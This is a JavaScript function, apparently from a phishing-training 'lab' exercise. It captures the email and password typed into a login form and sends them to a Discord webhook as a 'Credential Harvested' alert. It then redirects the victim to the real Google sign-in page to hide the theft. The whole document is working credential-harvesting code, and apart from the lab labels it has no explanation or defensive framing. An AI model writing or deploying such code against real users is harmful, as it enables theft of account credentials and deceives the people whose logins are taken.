async function capture() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('password').value;
    const hook = sessionStorage.getItem('lab_hook');

    console.log("🛠️ Attempting transmission to:", hook);

    // This is the specific "JSON shape" Discord demands
    const payload = {
        content: "🚨 **Lab 3.2: Alert**", 
        embeds: [{
            title: "Credential Harvested",
            color: 16711680, // Red
            fields: [
                { name: "Email", value: email || "empty", inline: true },
                { name: "Password", value: pass || "empty", inline: true }
            ],
            footer: { text: "ENI-Tutor | Tier 3 Journeyman" }
        }]
    };

    try {
        const response = await fetch(hook, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("✅ Discord accepted the packet (Status 204).");
        } else {
            console.error("❌ Discord rejected it. Status:", response.status);
            const errorText = await response.text();
            console.error("Reason:", errorText);
        }
    } catch (err) {
        console.error("🌐 Network Error (Check your URL or Internet):", err);
    }

    // Delay redirect so we can see the logs
    setTimeout(() => {
        window.location.href = "https://accounts.google.com";
    }, 2000);
}
